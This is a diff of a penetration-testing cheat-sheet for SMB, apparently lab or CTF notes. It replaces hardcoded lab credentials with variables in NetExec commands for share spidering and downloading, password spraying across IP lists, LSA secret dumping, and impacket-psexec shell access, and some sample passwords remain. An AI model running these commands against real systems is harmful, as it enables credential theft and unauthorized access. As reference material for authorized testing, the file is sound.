@@ -22,10 +22,10 @@ nxc smb $VICTIM_IP -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True EXC
 nxc smb $VICTIM_IP -u '' -p '' --share 'SHARE_NAME' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=52428800
 
 # for multiple ips
-nxc --verbose smb ./ips.txt -u corpmngr -p 'User4&*&*' --continue-on-success
+nxc --verbose smb ./ips.txt -u $USER -p '$PASS' --continue-on-success
 
 ## if the we found the credents of user which is local administrator then we can run command to dump the lsa
-nxc smb $VICTIM_IP -u john -p User1@#$%6 --lsa --verbose
+nxc smb $VICTIM_IP -u $USER -p User1@#$%6 --lsa --verbose
 
 # Connecting to the system if smb is Pwned!
 impacket-psexec $DOMAIN/Administrator@Pass123123@$VICTIM_IP
@@ -39,7 +39,7 @@ mget *
 # Connect to SMB using Kerberos authentication (-k) instead of NTLM 
 # -k flag is required when NTLM is disabled on the target (STATUS_NOT_SUPPORTED) OR (NTLM:False)
 # Use FQDN (dc01.$DOMAIN) not IP for Kerberos to work properly
-nxc smb dc01.$DOMAIN -u P.Rosa -p Rosaisbest123 -k --shares
+nxc smb dc01.$DOMAIN -u $USER -p $PASS -k --shares
 ```
 
 # <span style="color:#FF5555">LDAP anonymous bind</span>
